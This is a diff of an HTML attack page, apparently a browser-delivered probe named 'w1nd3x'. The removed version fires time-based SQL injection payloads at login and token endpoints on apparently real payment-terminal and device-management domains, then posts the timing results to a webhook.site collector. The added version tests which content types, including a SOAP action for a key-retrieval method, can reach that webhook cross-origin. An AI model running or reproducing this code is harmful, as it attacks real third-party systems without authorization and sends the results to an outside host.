@@ -1,28 +1,22 @@
-<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe9</title></head>
-<body><h1>w1nd3x relay probe v9 sqli-timing</h1><pre id="out"></pre>
+<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe10</title></head>
+<body><h1>w1nd3x probe v10 blob-content-type</h1><pre id="out"></pre>
 <script>
-const WH="https://webhook.site/50d69fd6-da64-4eff-b409-5274db2c23ab";
-const RES=[];
-function send(o){try{fetch(WH,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(o)});}catch(e){}}
-const SL=["BASE","x","x' AND SLEEP(5) AND 'a'='a","x';WAITFOR DELAY '0:0:5'--","x' AND 1=(SELECT 1 FROM PG_SLEEP(5))--","x'||DBMS_PIPE.RECEIVE_MESSAGE('w',5)||'","x\" AND SLEEP(5)#","x' OR SLEEP(5)#"];
-function t(u,m,ct,body){const t0=performance.now();
- const init={method:m,mode:'no-cors',credentials:'omit'};
- if(ct)init.headers={'Content-Type':ct};
- if(body!==undefined)init.body=body;
- return fetch(u,init).then(()=>Math.round(performance.now()-t0)).catch(()=>-Math.round(performance.now()-t0));}
-async function suite(name,build){
- const jobs=SL.map((p,i)=>{const [u,m,ct,b]=build(p,i); return t(u,m,ct,b).then(ms=>({n:name,i:i,p:p.slice(0,34),ms:ms}));});
- const r=await Promise.all(jobs); r.forEach(x=>RES.push(x));
- document.getElementById('out').textContent+="\n"+JSON.stringify(r);
+const WH="https://webhook.site/ebc50061-2d2e-40fc-936a-af1e8015895c";
+function log(s){document.getElementById('out').textContent+="\n"+s;}
+async function tryBlob(tag, type, body){
+  try{
+    const b=new Blob([body],{type:type});
+    await fetch(WH+"?probe="+encodeURIComponent(tag),{method:'POST',mode:'no-cors',body:b});
+    log(tag+" sent");
+  }catch(e){ log(tag+" ERR "+e); }
 }
 (async()=>{
- await Promise.all([
-  suite('tms-login',(p)=>["https://tms.bbpos.com/login?w="+Math.random(),"POST","application/x-www-form-urlencoded","username="+encodeURIComponent(p)+"&password=w1nd3x"]),
-  suite('wm-tokenGET',(p)=>["https://portal.wisemanager.com/mdm/getUserInfByToken?token="+encodeURIComponent(p)+"&w="+Math.random(),"GET",null,undefined]),
-  suite('wm-tokenPOST',(p)=>["https://portal.wisemanager.com/mdm/getUserInfByToken?w="+Math.random(),"POST","application/x-www-form-urlencoded","token="+encodeURIComponent(p)]),
-  suite('dss-login',(p)=>["https://developer.bbpos.com/login?w="+Math.random(),"POST","application/x-www-form-urlencoded","txtUsername="+encodeURIComponent(p)+"&txtPassword=w1nd3x"])
- ]);
- send({v:9,ua:navigator.userAgent.slice(0,40),res:RES});
+ await tryBlob('plain','text/plain','hello');
+ await tryBlob('textxml','text/xml; charset=utf-8','<a>w1nd3x</a>');
+ await tryBlob('soap12','application/soap+xml; charset=utf-8; action="http://tempuri.org/getbdkByVendorIDv3"','<soap12/>');
+ await tryBlob('json','application/json','{"a":1}');
+ // also try explicit header in no-cors
+ try{ await fetch(WH+"?probe=hdrxml",{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/xml'},body:'<b>x</b>'}); log('hdrxml sent'); }catch(e){ log('hdrxml ERR '+e); }
  await new Promise(r=>setTimeout(r,2500));
 })();
 </script></body></html>
